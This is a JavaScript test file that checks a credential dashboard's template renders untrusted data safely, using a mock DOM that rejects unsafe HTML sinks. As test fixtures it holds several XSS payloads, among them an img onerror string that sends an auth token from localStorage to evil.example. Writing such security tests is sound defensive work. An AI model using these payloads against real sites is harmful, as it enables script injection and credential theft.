import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const htmlPath = path.join(__dirname, 'ui_template.html');

// Minimal DOM implementation that explicitly throws if any unsafe HTML sink
// (innerHTML, outerHTML, insertAdjacentHTML, inline on* attributes) is ever used.
class MockTextNode {
  constructor(data) {
    this.nodeType = 3;
    this.data = String(data);
  }
  get textContent() {
    return this.data;
  }
}

class MockElement {
  constructor(tagName, id = '') {
    this.nodeType = 1;
    this.tagName = tagName.toUpperCase();
    this.id = id;
    this.className = '';
    this.style = {};
    this.children = [];
    this.listeners = new Map();
    this.checked = false;
    this.value = '';
    this.disabled = false;
    this.colSpan = 1;
    this._textContent = '';
  }

  get textContent() {
    if (this.children.length === 0) return this._textContent;
    return this.children.map((c) => c.textContent).join('');
  }

  set textContent(val) {
    this.children = [];
    this._textContent = String(val);
  }

  set innerHTML(_val) {
    throw new Error(`Unsafe innerHTML sink used on <${this.tagName}>`);
  }

  set outerHTML(_val) {
    throw new Error(`Unsafe outerHTML sink used on <${this.tagName}>`);
  }

  insertAdjacentHTML() {
    throw new Error(`Unsafe insertAdjacentHTML sink used on <${this.tagName}>`);
  }

  setAttribute(name, _value) {
    if (/^on/i.test(String(name))) {
      throw new Error(`Unsafe inline event handler attribute ${name} set on <${this.tagName}>`);
    }
  }

  addEventListener(type, listener) {
    const list = this.listeners.get(type) || [];
    list.push(listener);
    this.listeners.set(type, list);
  }

  appendChild(node) {
    this.children.push(node);
    return node;
  }

  replaceChildren(...nodes) {
    this._textContent = '';
    this.children = [...nodes];
  }
}

function loadDashboardContext({ fetchImpl } = {}) {
  const html = fs.readFileSync(htmlPath, 'utf8');
  const scriptMatches = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)];
  assert.equal(scriptMatches.length, 1, 'expected a single inline <script> block');
  const scriptSource = scriptMatches[0][1];

  const elementsById = new Map([
    ['cfgEnabled', new MockElement('input', 'cfgEnabled')],
    ['cfgRestoreOnDisable', new MockElement('input', 'cfgRestoreOnDisable')],
    ['cfgInterval', new MockElement('input', 'cfgInterval')],
    ['cfgHealthy', new MockElement('input', 'cfgHealthy')],
    ['cfgCritical', new MockElement('input', 'cfgCritical')],
    ['cfgPrioHealthy', new MockElement('input', 'cfgPrioHealthy')],
    ['cfgPrioLow', new MockElement('input', 'cfgPrioLow')],
    ['cfgPrioCritical', new MockElement('input', 'cfgPrioCritical')],
    ['enabledBadge', new MockElement('span', 'enabledBadge')],
    ['lastSyncText', new MockElement('div', 'lastSyncText')],
    ['credTableBody', new MockElement('tbody', 'credTableBody')],
    ['errorBanner', new MockElement('div', 'errorBanner')],
    ['syncNowBtn', new MockElement('button', 'syncNowBtn')],
    ['restoreBtn', new MockElement('button', 'restoreBtn')],
    ['refreshBtn', new MockElement('button', 'refreshBtn')],
    ['saveConfigBtn', new MockElement('button', 'saveConfigBtn')],
  ]);

  const document = {
    getElementById(id) {
      const el = elementsById.get(id);
      if (!el) throw new Error(`Unknown element id: ${id}`);
      return el;
    },
    createElement(tag) {
      return new MockElement(tag);
    },
    createTextNode(text) {
      return new MockTextNode(text);
    },
    write() {
      throw new Error('Unsafe document.write sink called');
    },
  };

  // Default to a non-resolving fetch so the script's boot-time loadStatus() call
  // cannot race with assertions in async tests.
  const defaultFetch = () => new Promise(() => {});

  const context = vm.createContext({
    document,
    localStorage: { getItem: () => null },
    fetch: fetchImpl || defaultFetch,
    console,
    Set,
    Array,
    Number,
    String,
    Math,
    Date,
    Object,
    JSON,
    Error,
    Promise,
  });

  vm.runInContext(scriptSource, context);
  return { context, elementsById };
}

function collectTags(node, out = []) {
  if (node.nodeType === 1) {
    out.push(node.tagName);
    for (const child of node.children) {
      collectTags(child, out);
    }
  }
  return out;
}

test('renderStatus neutralizes hostile HTML/XSS payloads in credential and quota metadata', async () => {
  const { context, elementsById } = loadDashboardContext();

  const hostileLabel = '<img src=x onerror="fetch(\'https://evil.example/?k=\'+localStorage.getItem(\'cli-proxy-auth\'))">';
  const hostileName = '<script>alert("xss-name")</script>cred.json';
  const hostileProvider = '"><svg onload=alert(1)>';
  const hostileRowLabel = '<iframe src="javascript:alert(1)">5h</iframe>';
  const hostileQuotaStatus = '<img src=x onerror=alert(2)>';
  const hostileTier = 'healthy" onclick="alert(3)';

  context.renderStatus({
    config: { auto_balance_enabled: true },
    lastSyncAt: '2026-11-21T00:00:00Z',
    credentials: [
      {
        label: hostileLabel,
        name: hostileName,
        provider: hostileProvider,
        quota: {
          status: 'ok',
          rows: [
            { label: hostileRowLabel, percent: 87.6 },
            { label: 'missing-pct', percent: null },
            { label: 'empty-pct', percent: '' },
          ],
        },
        target: {
          bottleneckPercent: 88,
          averagePercent: 88,
          tier: hostileTier,
          priority: 0,
          weight: 88,
        },
        currentPriority: 0,
        currentWeight: 88,
        hasOriginal: true,
        originalPriority: 1,
        originalWeight: 50,
      },
      {
        label: '',
        name: 'empty-quota.json',
        provider: 'codex',
        quota: {
          status: hostileQuotaStatus,
          rows: [],
        },
      },
    ],
  });

  // Yield to the microtask queue to prove boot-time loadStatus() does not clobber rendered state.
  await Promise.resolve();

  const tbody = elementsById.get('credTableBody');
  assert.equal(tbody.children.length, 2);

  // Ensure no injected HTML elements (<IMG>, <SCRIPT>, <SVG>, <IFRAME>) were created.
  const tags = collectTags(tbody);
  for (const forbidden of ['IMG', 'SCRIPT', 'SVG', 'IFRAME']) {
    assert.ok(!tags.includes(forbidden), `unexpected injected tag <${forbidden}> in DOM`);
  }

  // Row 0: all hostile strings must appear verbatim as inert textContent.
  const row0 = tbody.children[0];
  assert.equal(row0.children[0].children[0].textContent, hostileLabel);
  assert.equal(row0.children[0].children[1].textContent, hostileName);
  assert.equal(row0.children[1].textContent, hostileProvider);
  assert.equal(row0.children[2].children[0].textContent, `${hostileRowLabel}: 88%`);
  assert.equal(row0.children[2].children[1].textContent, 'missing-pct: -');
  assert.equal(row0.children[2].children[2].textContent, 'empty-pct: -');

  // Untrusted tier value must not inject extra classes into badge className.
  const tierBadge = row0.children[4].children[0];
  assert.equal(tierBadge.className, 'badge neutral');
  assert.equal(tierBadge.textContent, hostileTier.toUpperCase());

  // Row 1: hostile quota.status fallback must render as inert textContent.
  const row1 = tbody.children[1];
  assert.equal(row1.children[2].children[0].textContent, hostileQuotaStatus);
});

test('renderStatus applies allowed tier badge classes for valid tiers', () => {
  const { context, elementsById } = loadDashboardContext();

  context.renderStatus({
    config: { auto_balance_enabled: true },
    credentials: [
      { name: 'a.json', target: { bottleneckPercent: 80, averagePercent: 80, tier: 'healthy', priority: 0, weight: 80 } },
      { name: 'b.json', target: { bottleneckPercent: 10, averagePercent: 30, tier: 'low', priority: -5, weight: 10 } },
      { name: 'c.json', target: { bottleneckPercent: 2, averagePercent: 20, tier: 'critical', priority: -10, weight: 1 } },
    ],
  });

  const tbody = elementsById.get('credTableBody');
  assert.equal(tbody.children.length, 3);
  assert.equal(tbody.children[0].children[4].children[0].className, 'badge healthy');
  assert.equal(tbody.children[0].children[4].children[0].textContent, 'HEALTHY');
  assert.equal(tbody.children[1].children[4].children[0].className, 'badge low');
  assert.equal(tbody.children[1].children[4].children[0].textContent, 'LOW');
  assert.equal(tbody.children[2].children[4].children[0].className, 'badge critical');
  assert.equal(tbody.children[2].children[4].children[0].textContent, 'CRITICAL');
});

test('renderStatus handles empty credentials list and binds UI event listeners', () => {
  const { context, elementsById } = loadDashboardContext();
  context.renderStatus({ config: { auto_balance_enabled: false }, credentials: [] });

  const tbody = elementsById.get('credTableBody');
  assert.equal(tbody.children.length, 1);
  assert.equal(tbody.children[0].children[0].textContent, 'No credentials found.');

  // Verify programmatic event binding replaced inline onclick/onchange handlers.
  assert.equal(elementsById.get('syncNowBtn').listeners.get('click')?.length, 1);
  assert.equal(elementsById.get('restoreBtn').listeners.get('click')?.length, 1);
  assert.equal(elementsById.get('refreshBtn').listeners.get('click')?.length, 1);
  assert.equal(elementsById.get('saveConfigBtn').listeners.get('click')?.length, 1);
  assert.equal(elementsById.get('cfgEnabled').listeners.get('change')?.length, 1);
  assert.equal(elementsById.get('cfgRestoreOnDisable').listeners.get('change')?.length, 1);
});
